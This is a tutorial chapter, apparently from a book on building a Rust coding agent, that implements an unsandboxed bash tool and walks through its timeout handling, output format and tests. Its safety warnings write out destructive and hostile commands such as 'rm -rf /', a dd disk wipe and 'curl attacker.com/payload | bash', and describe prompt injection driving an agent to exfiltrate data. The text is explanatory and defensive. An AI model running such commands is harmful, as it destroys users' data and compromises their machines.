# Chapter 7: Bash Tool

The bash tool is the most powerful tool in a coding agent. It is also the most dangerous. With a single tool call, the LLM can compile code, run tests, install packages, inspect processes, query databases, or delete your entire filesystem. Every other tool -- read, write, edit, grep -- does one thing. Bash does everything.

This power is what makes a coding agent useful. An agent that can only read and write files is a fancy text editor. An agent that can run arbitrary shell commands is a programmer. It can try things, see what happens, and iterate -- the same workflow a human developer follows. Claude Code's bash tool is its most-used tool by far, accounting for the majority of all tool invocations in a typical session.

In this chapter you will build the `BashTool`. It takes a command string, runs it in a bash subprocess with a timeout, and returns the combined output. The implementation is straightforward -- the hard part is everything we deliberately leave out. There is no sandboxing, no command filtering, no permission checking. The LLM can run anything. Chapters 10-13 add the safety rails. For now, we build the engine and trust the driver.

## The BashTool

Open `src/tools/bash.rs`. Here is the complete implementation:

```rust
use async_trait::async_trait;
use serde_json::Value;

use crate::types::*;

pub struct BashTool {
    def: ToolDefinition,
}

impl BashTool {
    pub fn new() -> Self {
        Self {
            def: ToolDefinition::new("bash", "Run a bash command and return its output")
                .param("command", "string", "The bash command to run", true)
                .param(
                    "timeout",
                    "integer",
                    "Timeout in seconds (default: 120)",
                    false,
                ),
        }
    }
}

impl Default for BashTool {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Tool for BashTool {
    fn definition(&self) -> &ToolDefinition {
        &self.def
    }

    async fn call(&self, args: Value) -> anyhow::Result<ToolResult> {
        let command = args["command"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("missing 'command' argument"))?;

        let timeout_secs = args
            .get("timeout")
            .and_then(|v| v.as_u64())
            .unwrap_or(120);

        let output = tokio::time::timeout(
            std::time::Duration::from_secs(timeout_secs),
            tokio::process::Command::new("bash")
                .arg("-c")
                .arg(command)
                .output(),
        )
        .await;

        let output = match output {
            Ok(Ok(o)) => o,
            Ok(Err(e)) => return Ok(ToolResult::error(format!("failed to run command: {e}"))),
            Err(_) => {
                return Ok(ToolResult::error(format!(
                    "command timed out after {timeout_secs}s"
                )));
            }
        };

        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let exit_code = output.status.code().unwrap_or(-1);

        let mut result = String::new();
        if !stdout.is_empty() {
            result.push_str(&stdout);
        }
        if !stderr.is_empty() {
            if !result.is_empty() {
                result.push('\n');
            }
            result.push_str("stderr: ");
            result.push_str(&stderr);
        }

        if exit_code != 0 {
            if !result.is_empty() {
                result.push('\n');
            }
            result.push_str(&format!("exit code: {exit_code}"));
        }

        if result.is_empty() {
            result.push_str("(no output)");
        }

        Ok(ToolResult::text(result))
    }

    fn is_destructive(&self) -> bool {
        true
    }

    fn summary(&self, args: &Value) -> String {
        match args.get("command").and_then(|v| v.as_str()) {
            Some(cmd) => {
                let short = if cmd.len() > 60 {
                    format!("{}...", &cmd[..57])
                } else {
                    cmd.to_string()
                };
                format!("[bash: {short}]")
            }
            None => "[bash]".into(),
        }
    }

    fn activity_description(&self, _args: &Value) -> Option<String> {
        Some("Running command...".into())
    }
}
```

Let's walk through each piece.

### The definition

```rust
ToolDefinition::new("bash", "Run a bash command and return its output")
    .param("command", "string", "The bash command to run", true)
    .param("timeout", "integer", "Timeout in seconds (default: 120)", false)
```

Two parameters. `command` is a required string -- the shell command to execute. `timeout` is an optional integer that lets the LLM override the default timeout. Most tool calls will not include a timeout; 120 seconds is generous for typical operations like running tests or compiling code. But if the LLM knows a command will be slow (a large build, a network operation), it can request more time.

The description "Run a bash command and return its output" is deliberately simple. The LLM already knows what bash is. Over-describing the tool wastes prompt tokens and can confuse the model into overthinking when to use it.

### Argument extraction

```rust
let command = args["command"]
    .as_str()
    .ok_or_else(|| anyhow::anyhow!("missing 'command' argument"))?;

let timeout_secs = args
    .get("timeout")
    .and_then(|v| v.as_u64())
    .unwrap_or(120);
```

The `command` extraction uses `ok_or_else` with `?` to return an `Err` if the argument is missing. This is one of the rare cases where we return a genuine error rather than `ToolResult::error(...)` -- a bash call without a command is a protocol violation, not a tool failure. The LLM should never produce this, and if it does, the query engine's error handling will catch it.

The `timeout` extraction uses the more defensive pattern: `get` + `and_then` + `unwrap_or`. If the key is missing, if it is not a number, or if it is null, we silently default to 120. This is the right approach for optional parameters -- be permissive on input, strict on output.

### Running the command

```rust
let output = tokio::time::timeout(
    std::time::Duration::from_secs(timeout_secs),
    tokio::process::Command::new("bash")
        .arg("-c")
        .arg(command)
        .output(),
)
.await;
```

Three layers here, each doing one thing:

1. **`tokio::process::Command`** spawns an async subprocess. We use `bash -c` so the command string is interpreted by bash, not executed as a raw binary. This means pipes, redirects, semicolons, and all other shell features work: `echo hello | wc -c`, `ls > out.txt`, `cd /tmp && pwd`.

2. **`.output()`** collects the process's stdout, stderr, and exit status. This buffers everything in memory. For a production agent you would want streaming (pipe stdout/stderr to the TUI in real time), but buffered collection is simpler and sufficient for our purposes.

3. **`tokio::time::timeout`** wraps the entire operation in a deadline. If the command does not finish within `timeout_secs` seconds, the future is cancelled and we get an `Err(Elapsed)`.

## The timeout design

Without a timeout, a single bad command can hang the agent forever. The LLM might run `sleep infinity`, start a server that listens on a port, or trigger an interactive program that waits for stdin. Any of these blocks the agent loop indefinitely -- no more tool calls, no more responses, just a frozen process burning compute.

The timeout gives us a hard deadline. After it expires, we return an error message to the LLM and the loop continues. The model sees "command timed out after 120s" and can adjust -- run a different command, add a timeout flag, or tell the user the operation is too slow.

### The two-level Result

The `timeout` + `output()` combination produces a nested `Result` that deserves careful attention:

```rust
let output = match output {
    Ok(Ok(o)) => o,
    Ok(Err(e)) => return Ok(ToolResult::error(format!("failed to run command: {e}"))),
    Err(_) => {
        return Ok(ToolResult::error(format!(
            "command timed out after {timeout_secs}s"
        )));
    }
};
```

Three cases:

- **`Ok(Ok(output))`** -- The command finished within the timeout and the process spawned successfully. This is the happy path. `output` is a `std::process::Output` containing stdout, stderr, and exit status.

- **`Ok(Err(e))`** -- The timeout did not expire, but the process failed to spawn. This happens when `bash` itself is not found (unlikely on most systems) or when the OS refuses to create the process (too many open files, permission denied). We return a `ToolResult::error` so the LLM can see what went wrong.

- **`Err(_)`** -- The timeout elapsed. The command is still running somewhere (the OS process is not automatically killed -- more on this in the Claude Code comparison below). We return a `ToolResult::error` with the timeout message.

All three cases return `Ok(...)` from the function. Tool failures are values, not errors. The agent loop continues regardless.

## Output format

The output construction logic handles four concerns: stdout, stderr, exit code, and the empty case.

```rust
let stdout = String::from_utf8_lossy(&output.stdout);
let stderr = String::from_utf8_lossy(&output.stderr);
let exit_code = output.status.code().unwrap_or(-1);

let mut result = String::new();
if !stdout.is_empty() {
    result.push_str(&stdout);
}
if !stderr.is_empty() {
    if !result.is_empty() {
        result.push('\n');
    }
    result.push_str("stderr: ");
    result.push_str(&stderr);
}

if exit_code != 0 {
    if !result.is_empty() {
        result.push('\n');
    }
    result.push_str(&format!("exit code: {exit_code}"));
}

if result.is_empty() {
    result.push_str("(no output)");
}
```

Walk through each decision:

**`String::from_utf8_lossy`** converts the raw bytes to a string, replacing invalid UTF-8 sequences with the replacement character. Command output is not guaranteed to be valid UTF-8 -- binary data, locale-dependent encodings, or corrupted streams can all produce invalid bytes. Lossy conversion is the right default because the LLM needs a string, and a few replacement characters are better than a crash.

**Stdout comes first, undecorated.** This is the primary output. When `ls` lists files or `cat` prints content, that output appears verbatim. No prefix, no wrapping.

**Stderr is prefixed with `"stderr: "`.** This lets the LLM distinguish normal output from error output. Many commands write diagnostics to stderr even on success (compiler warnings, progress indicators, deprecation notices). The prefix prevents the model from misinterpreting warnings as failures. The newline before the prefix is only added if stdout was non-empty, keeping the output clean when stderr is the only content.

**Exit code appears only on non-zero.** A zero exit code means success -- reporting it would be noise. A non-zero code is meaningful information: `exit code: 1` usually means a general error, `exit code: 2` often means misuse, `exit code: 127` means command not found, `exit code: 137` means killed by signal. The LLM can use these codes to diagnose problems. The `unwrap_or(-1)` handles the case where the process was killed by a signal and has no exit code -- we report -1 as a sentinel.

**`"(no output)"` for silent commands.** Commands like `true`, `mkdir -p /tmp/foo`, or `cp a b` produce no stdout and no stderr on success. Returning an empty string would confuse the LLM -- it might think the tool failed or the result was lost. The sentinel string confirms the command ran and had nothing to say.

## Safety flags

```rust
fn is_destructive(&self) -> bool {
    true
}
```

The bash tool is the only tool that returns `true` for `is_destructive`. This flag has concrete consequences in the permission system (Chapter 10): destructive tools require explicit user approval even when the agent is running in auto-approve mode. The reasoning is straightforward -- bash can do anything, including things that are irreversible. `rm -rf /`, `dd if=/dev/zero of=/dev/sda`, `curl ... | bash` -- these are all valid bash commands that the LLM could produce.

Notice that `is_read_only()` and `is_concurrent_safe()` both return their default `false`. Bash commands can write to the filesystem, so they are not read-only. Bash commands can interfere with each other (two concurrent `cargo build` invocations will race on the target directory), so they are not concurrent-safe.

## The summary method

```rust
fn summary(&self, args: &Value) -> String {
    match args.get("command").and_then(|v| v.as_str()) {
        Some(cmd) => {
            let short = if cmd.len() > 60 {
                format!("{}...", &cmd[..57])
            } else {
                cmd.to_string()
            };
            format!("[bash: {short}]")
        }
        None => "[bash]".into(),
    }
}
```

The summary is displayed in the TUI when the agent invokes a tool. It needs to be short -- a single line that tells the user what is happening. Long commands like `find /usr -name '*.so' -exec readelf -d {} \; | grep NEEDED | sort -u` get truncated to 60 characters with an ellipsis. The truncation point is 57 characters plus `"..."` to stay within the 60-character budget.

If the command argument is missing (which should not happen in practice), the fallback is just `"[bash]"`.

## Safety warning

This tool passes LLM-generated commands directly to a bash shell. There is no sandboxing, no command filtering, no allowlist, no denylist. The LLM can run `rm -rf /` and your filesystem is gone. It can run `curl attacker.com/payload | bash` and your machine is compromised. It can read your SSH keys, your environment variables, your browser cookies.

This is not a hypothetical concern. LLMs can be manipulated through prompt injection -- malicious instructions hidden in file contents, README files, or web pages that the agent processes. A carefully crafted prompt injection could instruct the model to exfiltrate data or destroy files.

For the purposes of this tutorial, the bash tool is safe to use with trusted prompts in a controlled environment. Do not point it at untrusted input. Do not run it on a machine with sensitive data. Use a container, a VM, or at minimum a dedicated user account with limited permissions.

Chapters 10-13 build the safety infrastructure that makes the bash tool safe for production:

- **Chapter 10 (Permissions)** adds the permission engine that gates every tool call, requiring user approval for destructive operations.
- **Chapter 11 (Safety)** adds command classification that detects and blocks dangerous patterns like `rm -rf`, `chmod 777`, and `curl | bash`.
- **Chapter 12 (Hooks)** adds pre-tool hooks that can inspect and reject commands before execution.
- **Chapter 13 (Plan Mode)** adds a read-only mode where destructive tools are blocked entirely.

Until you build those chapters, treat the bash tool with the respect you would give `sudo` access to an unpredictable collaborator.

## How Claude Code does it

Claude Code's bash tool shares the same core -- `bash -c <command>` with timeout -- but adds several layers of production hardening:

**Command filtering.** Before executing any command, Claude Code runs the command string through a safety classifier that checks for dangerous patterns. Commands like `rm -rf /`, `chmod -R 777`, `curl ... | sh`, and others are flagged or blocked outright. The classifier is not a simple regex -- it understands shell quoting and piping to avoid false positives.

**Working directory management.** Claude Code tracks and sets the working directory for each bash invocation. If the user `cd`s into a directory in one command, subsequent commands remember that directory. Our version always runs in the process's current directory.

**Process group killing on timeout.** When our tool times out, the spawned process may continue running in the background. Claude Code creates a process group for each command and kills the entire group on timeout, ensuring no orphan processes linger.

**Streaming stdout/stderr.** Rather than buffering all output and returning it at the end, Claude Code pipes stdout and stderr to the TUI in real time. The user sees compilation output, test results, and progress indicators as they happen. This is essential for long-running commands where waiting for the final result would leave the user staring at a blank screen.

**Permission engine integration.** Every bash command passes through the permission engine before execution. Depending on the configuration, the user may be prompted to approve the command, the command may be auto-approved if it matches a safe pattern, or it may be denied outright.

Our version is the core protocol without the safety wrapping -- the minimal viable implementation that demonstrates how an LLM interacts with a shell. The production features are layers on top, not changes to the fundamental design.

## Tests

Run the chapter 7 tests:

```bash
cargo test -p claw-code test_ch7
```

Here is what each test verifies:

**`test_ch7_bash_echo`** -- The simplest case. Runs `echo hello` and checks that the output contains "hello". Verifies that basic command execution works and stdout is captured.

**`test_ch7_bash_exit_code`** -- Runs `exit 42` and checks that the output contains "exit code: 42". Verifies that non-zero exit codes are reported in the output.

**`test_ch7_bash_stderr`** -- Runs `echo oops >&2` (redirects to stderr) and checks that the output contains the "stderr:" prefix and the message. Verifies that stderr is captured and labeled.

**`test_ch7_bash_stdout_and_stderr`** -- Runs `echo out; echo err >&2` and checks that both streams appear in the output. Verifies that stdout and stderr are combined correctly when both are present.

**`test_ch7_bash_no_output`** -- Runs `true` (a command that succeeds silently) and checks that the output is exactly `"(no output)"`. Verifies the sentinel string for commands with no output.

**`test_ch7_bash_timeout`** -- Runs `sleep 10` with a 1-second timeout and checks that the output contains "timed out". Verifies that the timeout mechanism works and returns an error message rather than hanging.

**`test_ch7_bash_is_destructive`** -- Checks that `is_destructive()` returns `true`, `is_read_only()` returns `false`, and `is_concurrent_safe()` returns `false`. Verifies the safety flags.

**`test_ch7_bash_definition`** -- Checks that the tool name is "bash" and the description mentions "bash". Verifies the tool definition.

**`test_ch7_bash_summary`** -- Checks that `summary({"command": "ls -la"})` returns `"[bash: ls -la]"`. Verifies the TUI display string.

**`test_ch7_bash_multiline`** -- Runs `echo one; echo two; echo three` and checks that all three lines appear. Verifies that multi-command pipelines work through `bash -c`.

**`test_ch7_bash_with_file`** -- An integration test. Creates a temp directory, runs `echo 'created by bash' > <path>`, then reads the file with `std::fs` to verify the content was written. Demonstrates that bash commands have real filesystem side effects.

## Recap

You have built the bash tool -- the most important and most dangerous tool in the agent's toolkit:

- **`command` + `timeout`** are the two parameters. The command is required; the timeout defaults to 120 seconds.
- **`tokio::process::Command`** with `bash -c` gives the LLM full shell access -- pipes, redirects, variables, and everything else bash supports.
- **`tokio::time::timeout`** prevents hung commands from blocking the agent forever. The two-level `Result` cleanly separates timeouts from spawn failures from successful execution.
- **Output format** combines stdout, labeled stderr, and non-zero exit codes into a single string. Silent commands return `"(no output)"` so the LLM knows the command ran.
- **`is_destructive: true`** marks this as the one tool that requires explicit approval in the permission system.
- **No safety rails** -- this chapter builds the raw capability. The permission engine, safety classifier, hooks, and plan mode come in later chapters.

The bash tool completes the core tool set. Your agent can now read files, write files, edit files, and run arbitrary commands. With the query engine from Chapter 4 driving the loop, you have a functioning coding agent -- one that can understand a codebase, make changes, run tests, and iterate until the job is done.

## What's next

In [Chapter 8: Search Tools](./ch08-search-tools.md) you will build the tools that help the agent navigate large codebases -- glob for finding files by pattern and grep for searching file contents. These read-only tools are the agent's eyes, complementing the hands (bash, write, edit) you have already built.
